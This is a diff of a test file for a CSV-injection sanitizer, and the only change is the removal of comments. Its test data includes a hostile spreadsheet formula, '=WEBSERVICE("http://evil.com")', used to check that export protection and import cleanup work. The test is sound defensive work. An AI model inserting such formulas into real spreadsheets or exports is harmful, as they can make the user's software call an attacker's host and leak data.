@@ -65,7 +65,6 @@ describe('csvSecurity', () => {
       const phoneNumber = '+1-555-123-4567';
       const result = sanitizeValueForCSVExport(phoneNumber);
       expect(result).toBe(`${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`);
-      // Should be visually identical to user
       expect(result.substring(1)).toBe(phoneNumber);
     });
 
@@ -292,7 +291,6 @@ describe('csvSecurity', () => {
         expect(sanitized).toBe(CSV_INJECTION_PREVENTION_ZWJ + text);
         expect(containsCSVProtectionZWJ(sanitized)).toBe(true);
 
-        // Should restore perfectly
         expect(restored).toBe(text);
       });
     });
@@ -333,14 +331,12 @@ describe('csvSecurity', () => {
         ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
       ];
 
-      // Simulate the import cleanup process
       const cleanedData = exportedData.map((row) =>
         row.map((cell) =>
           typeof cell === 'string' ? cleanZWJFromImportedValue(cell) : cell,
         ),
       );
 
-      // Verify the data is properly restored
       expect(cleanedData).toEqual([
         ['Name', 'Formula', 'Phone'],
         ['John Doe', '=WEBSERVICE("http://evil.com")', '+1-555-123-4567'],
